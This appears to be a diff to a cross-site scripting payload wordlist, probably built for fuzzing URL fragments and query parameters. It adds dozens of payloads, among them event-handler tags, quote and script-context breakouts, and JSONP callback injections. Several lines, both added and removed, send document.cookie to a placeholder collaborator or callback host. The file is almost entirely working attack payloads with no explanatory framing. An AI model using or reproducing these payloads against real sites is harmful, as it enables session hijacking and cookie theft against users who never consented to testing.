@@ -1,3 +1,37 @@
-javascript:fetch('https://CALLBACK/?c='+document.cookie)
-javascript:new Image().src='https://CALLBACK/?c='+document.cookie
-javascript:location='https://CALLBACK/?c='+document.cookie
+#<img src=x onerror=fetch('//COLLABORATOR_URL/?c='+document.cookie)>
+#<script>fetch('//COLLABORATOR_URL/?c='+document.cookie)</script>
+#<svg onload=fetch('//COLLABORATOR_URL/?c='+document.cookie)>
+#javascript:alert(1)
+#alert(1)
+#";alert(1)//
+#';alert(1)//
+#`+alert(1)+`
+#'-alert(1)-'
+#"-alert(1)-"
+#<script>fetch('//COLLABORATOR_URL/?c='+document.cookie)</script>
+#%3Cscript%3Efetch('//COLLABORATOR_URL/?c='+document.cookie)%3C/script%3E
+#<a href=javascript:fetch('//COLLABORATOR_URL/?c='+document.cookie)>click</a>
+?xss=<script>alert(1)</script>
+?q=<img src=x onerror=alert(1)>
+?search=<svg onload=alert(1)>
+?input=javascript:alert(1)
+?next=javascript:alert(1)
+?url=javascript:alert(1)
+?redirect=javascript:alert(1)
+?continue=javascript:alert(1)
+?callback=alert(1)
+?jsonp=alert(1)
+?cb=alert
+?fn=alert
+?handler=alert
+?action=alert(1)
+?page=<script>alert(1)</script>
+?name=<img src=x onerror=alert(1)>
+?message=<svg onload=alert(1)>
+?content=<script>fetch('//COLLABORATOR_URL/?c='+document.cookie)</script>
+?data=<img src=x onerror=fetch('//COLLABORATOR_URL/?c='+document.cookie)>
+?value="><img src=x onerror=alert(1)>
+?text='><img src=x onerror=alert(1)>
+?title=<details open ontoggle=alert(1)>
+?desc=<body onload=alert(1)>
+?html=<input autofocus onfocus=alert(1)>
